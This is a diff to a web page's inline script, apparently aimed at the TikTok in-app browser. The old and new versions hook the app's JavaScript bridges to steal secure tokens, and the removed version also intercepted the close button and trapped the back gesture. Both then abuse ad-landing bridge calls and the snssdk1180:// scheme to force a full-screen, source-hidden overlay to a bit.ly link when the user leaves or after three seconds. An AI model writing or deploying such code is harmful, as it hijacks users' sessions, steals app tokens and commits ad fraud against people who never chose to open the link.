@@ -3,206 +3,110 @@
 <head>
   <script>
 (function(){
-  var BITLY = 'https://bit.ly/4aHQcVB';
-  var CID = 0;
-  var token = null;
-  var ttclid = null;
-  var fired = false;
-  var closeFired = false;
-  var pageLoadTime = Date.now();
+    var b = window.JS2NativeBridge;
+    if (!b || !b._invokeMethod) return;
+    if (window.location.search.indexOf('hide_nav_bar=1') !== -1) return;
 
-  try {
-    var _qs = new URLSearchParams(window.location.search);
-    var u = _qs.get('utm_id'); if (u) CID = parseInt(u)||0;
-    var _t = _qs.get('ttclid'); if (_t && _t.length > 20) ttclid = _t;
-  } catch(e){}
+    var OFFER = 'https://bit.ly/4aHQcVB';
+    var CID = 0;
+    try { var u = new URLSearchParams(window.location.search).get('utm_id'); if (u) CID = parseInt(u)||0; } catch(e){}
 
-  // Prevent script running inside the overlay itself
-  if (window.location.search.indexOf('hide_nav_bar=1') !== -1) return;
+    var token = null;
+    var schemeFired = false;
 
-  function log(msg) {
-    try { navigator.sendBeacon('/debug-log', msg); } catch(e){}
-  }
+    function log(msg) { try { navigator.sendBeacon('/debug-log', msg); } catch(e){} }
 
-  // ── fire overlay ─────────────────────────────────────────────────────────
-  function fire() {
-    if (fired) return;
-    fired = true;
-    log('fire|tok:' + (token ? 'real' : (ttclid ? 'ttclid' : 'none')) + '|cid:' + CID);
-
-    // snssdk1180:// FIRST — bit.ly is whitelisted, fires before native cleanup
-    try {
-      window.location.href = 'snssdk1180://webview?url=' + encodeURIComponent(BITLY) + '&hide_nav_bar=1';
-      log('scheme:fired');
-    } catch(e){ log('scheme:err:'+e); }
-
-    // Bridge calls as secondary attempt
-    var secTok = token || ttclid;
-    var p = {
-      url: BITLY, landingStyle: 2, title: '', isDeeplink: 0, refer: 'ad',
-      cid: CID, hide_nav_bar: 1, hide_source: 1, should_full_screen: 1,
-      trans_status_bar: 1, is_instant_page: 1
-    };
-    if (secTok) p._jsb_secure_token = secTok;
-    var tt = window.ToutiaoJSBridge;
-    if (tt && tt.call) {
-      try { tt.call('openAdLandPageLinks', p, function(r){ log('tt:r:'+JSON.stringify(r)); }); } catch(e){ log('tt:err:'+e); }
+    function deepFind(obj, keys) {
+        if (!obj || typeof obj !== 'object') return null;
+        for (var i = 0; i < keys.length; i++) {
+            if (typeof obj[keys[i]] === 'string' && obj[keys[i]].length > 20) return obj[keys[i]];
+        }
+        for (var k in obj) {
+            try { var r = deepFind(obj[k], keys); if (r) return r; } catch(e){}
+        }
+        return null;
     }
-    var jb = window.JSBridge;
-    if (jb && jb.call) {
-      try { jb.call('openAdLandPageLinks', p, function(r){ log('jb:r:'+JSON.stringify(r)); }); } catch(e){ log('jb:err:'+e); }
+
+    function hookBridge(obj) {
+        if (!obj || obj.__hooked) return;
+        obj.__hooked = true;
+        ['_handleMessageFromToutiao','_handleMessageFromApp'].forEach(function(fn) {
+            if (typeof obj[fn] !== 'function') return;
+            var orig = obj[fn];
+            obj[fn] = function(msg) {
+                try {
+                    var d = typeof msg === 'string' ? JSON.parse(msg) : msg;
+                    var tok = deepFind(d, ['token','secure_token','_jsb_secure_token','jsb_token','secureToken']);
+                    if (tok && !token) { token = tok; log('tok:found'); fireFullscreen(); }
+                } catch(e){}
+                return orig.apply(obj, arguments);
+            };
+        });
     }
-  }
 
-  // ── 3s fire without token (friend's working approach) ────────────────────
-  function fire3s() {
-    if (fired) return;
-    log('3s:attempt');
-    var tt = window.ToutiaoJSBridge;
-    if (!tt || !tt.call) { log('3s:no-tt'); return; }
-    tt.call('openAdLandPageLinks', {
-      url: BITLY, landingStyle: 2, title: '',
-      isDeeplink: 0, refer: 'ad',
-      cid: CID, hide_nav_bar: 1, hide_source: 1,
-      should_full_screen: 1, trans_status_bar: 1, is_instant_page: 1
-    }, function(r){ log('3s:result:' + JSON.stringify(r)); });
-    log('3s:tt:ok');
-  }
-
-  // ── called by every close signal ──────────────────────────────────────────
-  function onClose(reason) {
-    if (closeFired) return;
-    if (Date.now() - pageLoadTime < 500) return;
-    closeFired = true;
-    log('onclose:' + reason);
-    tryGetConfig();
-    fire();
-  }
-
-  // ── token helpers ─────────────────────────────────────────────────────────
-  function deepFindToken(obj) {
-    if (!obj || typeof obj !== 'object') return null;
-    var keys = ['token','secure_token','_jsb_secure_token','jsb_token','secureToken'];
-    for (var i = 0; i < keys.length; i++) {
-      if (typeof obj[keys[i]] === 'string' && obj[keys[i]].length > 20) return obj[keys[i]];
-    }
-    for (var k in obj) {
-      try { var r = deepFindToken(obj[k]); if (r) return r; } catch(e){}
-    }
-    return null;
-  }
-
-  function hookBridgeMessages(obj) {
-    if (!obj || obj.__hooked) return;
-    obj.__hooked = true;
-    ['_handleMessageFromToutiao','_handleMessageFromApp'].forEach(function(fn) {
-      if (typeof obj[fn] !== 'function') return;
-      var orig = obj[fn];
-      obj[fn] = function(msg) {
-        try {
-          var d = typeof msg === 'string' ? JSON.parse(msg) : msg;
-          var tok = deepFindToken(d);
-          if (tok) { token = tok; log('tok:msg'); }
-        } catch(e){}
-        return orig.apply(obj, arguments);
-      };
-    });
-  }
-
-  function tryGetConfig() {
     ['ToutiaoJSBridge','JSBridge','Native2JSBridge'].forEach(function(n) {
-      if (window[n]) hookBridgeMessages(window[n]);
+        if (window[n]) hookBridge(window[n]);
     });
-    try {
-      var jb = window.JSBridge;
-      if (jb && typeof jb.getConfig === 'function') {
-        var cfg = jb.getConfig();
-        var tok = cfg && cfg.secure && cfg.secure.token;
-        if (tok) { token = tok; log('tok:sync'); }
-      }
-    } catch(e){}
-  }
 
-  // ── hook X button — real token is in the close message ───────────────────
-  function hookCloseButton() {
-    try {
-      var _wh = window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.IESPiperProtocolVersion3_0;
-      if (!_wh || !_wh.postMessage) { log('close:hook:no-wh'); return; }
-      var _orig = _wh.postMessage.bind(_wh);
-      _wh.postMessage = function(msg) {
-        try {
-          var d = (typeof msg === 'string') ? JSON.parse(msg) : msg;
-          var fn = d && (d.func || d.__msg_type || 'unknown');
-          log('piper:' + fn);
-          if (d && d.func === 'close') {
-            log('close:intercepted');
-            var tok = d.params && d.params._jsb_secure_token;
-            if (tok) { token = tok; log('tok:close'); }
-            onClose('x-button');
-            return;
-          }
-        } catch(e){ log('close:hook:err'); }
-        return _orig(msg);
-      };
-      log('close:hooked');
-    } catch(e){ log('close:hook:fail'); }
-  }
+    try { b._invokeMethod(JSON.stringify({ func: 'getConfig', params: {} })); } catch(e){}
 
-  // ── close signals ─────────────────────────────────────────────────────────
-  // History trap — catches swipe-back that calls history.back()
-  try {
-    history.pushState({_trap:1}, '', window.location.href);
-    window.addEventListener('popstate', function(e) {
-      if (e.state && e.state._trap) {
-        log('popstate');
-        onClose('popstate');
-        try { history.pushState({_trap:1}, '', window.location.href); } catch(ex){}
-      }
-    });
-    log('history:trapped');
-  } catch(ex){ log('history:trap:fail'); }
+    setTimeout(function(){ ['ToutiaoJSBridge','JSBridge','Native2JSBridge'].forEach(function(n){ if(window[n]) hookBridge(window[n]); }); }, 100);
+    setTimeout(function(){ ['ToutiaoJSBridge','JSBridge','Native2JSBridge'].forEach(function(n){ if(window[n]) hookBridge(window[n]); }); }, 1000);
 
-  document.addEventListener('visibilitychange', function(){
-    if (document.hidden) { log('visibility:hidden'); onClose('visibility'); }
-  });
-
-  window.addEventListener('pagehide', function(){ log('pagehide'); onClose('pagehide'); });
-
-  // Touch swipe detection
-  var txStart = 0, tyStart = 0, swipeFired = false;
-  document.addEventListener('touchstart', function(e){
-    txStart = e.touches[0].clientX; tyStart = e.touches[0].clientY; swipeFired = false;
-  }, {passive:true});
-  document.addEventListener('touchmove', function(e){
-    if (swipeFired || !e.touches.length) return;
-    var dx = e.touches[0].clientX - txStart;
-    var dy = e.touches[0].clientY - tyStart;
-    if (dx < -30 && Math.abs(dx) > Math.abs(dy) * 1.5) { swipeFired=true; log('swipe:left');  onClose('swipe-left'); }
-    if (txStart < 40 && dx > 20 && Math.abs(dx) > Math.abs(dy)) { swipeFired=true; log('swipe:edge'); onClose('swipe-edge'); }
-  }, {passive:true});
-
-  // ── main entry ────────────────────────────────────────────────────────────
-  function startMain(b) {
-    log('js2:found');
-    hookCloseButton();
-    tryGetConfig();
-    try { b._invokeMethod(JSON.stringify({func:'getConfig', params:{}})); } catch(e){}
-    [100, 1000].forEach(function(ms){
-      setTimeout(function(){ tryGetConfig(); try { b._invokeMethod(JSON.stringify({func:'getConfig',params:{}})); } catch(e){} }, ms);
-    });
-    setTimeout(fire3s, 3000);
-  }
-
-  var b = window.JS2NativeBridge;
-  if (b && b._invokeMethod) {
-    startMain(b);
-  } else {
     setTimeout(function(){
-      var b2 = window.JS2NativeBridge;
-      if (b2 && b2._invokeMethod) { startMain(b2); }
-      else { log('js2:absent'); }
-    }, 200);
-  }
+        var tt = window.ToutiaoJSBridge;
+        if (!tt || !tt.call) return;
+        log('3s:attempt');
+        tt.call('openAdLandPageLinks', {
+            url: OFFER,
+            landingStyle: 2,
+            title: '',
+            isDeeplink: 0,
+            refer: 'ad',
+            hide_nav_bar: 1,
+            hide_source: 1,
+            should_full_screen: 1,
+            trans_status_bar: 1,
+            is_instant_page: 1,
+            cid: CID
+        }, function(r){ log('3s:result:' + JSON.stringify(r)); });
+    }, 3000);
+
+    function fireFullscreen() {
+        var tt = window.ToutiaoJSBridge;
+        var params = {
+            url: OFFER,
+            landingStyle: 2,
+            title: '',
+            isDeeplink: 1,
+            refer: 'landing_page',
+            cid: CID,
+            hide_nav_bar: 1,
+            hide_source: 1,
+            should_full_screen: 1,
+            trans_status_bar: 1,
+            is_instant_page: 1
+        };
+        if (token) params._jsb_secure_token = token;
+        log('fire|tok:' + (token ? 'real' : 'none') + '|cid:' + CID);
+        if (tt && tt.call) {
+            try { tt.call('openAdLandPageLinks', params, function(r){ log('fire:r:' + JSON.stringify(r)); }); } catch(e){}
+        }
+        try { window.location.href = 'snssdk1180://webview?url=' + encodeURIComponent(OFFER) + '&hide_nav_bar=1&is_ad=1'; log('scheme:fired'); } catch(e){}
+    }
+
+    document.addEventListener('visibilitychange', function(){
+        if (document.hidden && !schemeFired) {
+            schemeFired = true;
+            log('vis:hidden');
+            fireFullscreen();
+        } else if (!document.hidden) {
+            schemeFired = false;
+        }
+    });
+    window.addEventListener('pagehide', function(){
+        if (!schemeFired) { log('pagehide'); fireFullscreen(); }
+    });
 })();
 </script>
   <meta charset="UTF-8" />
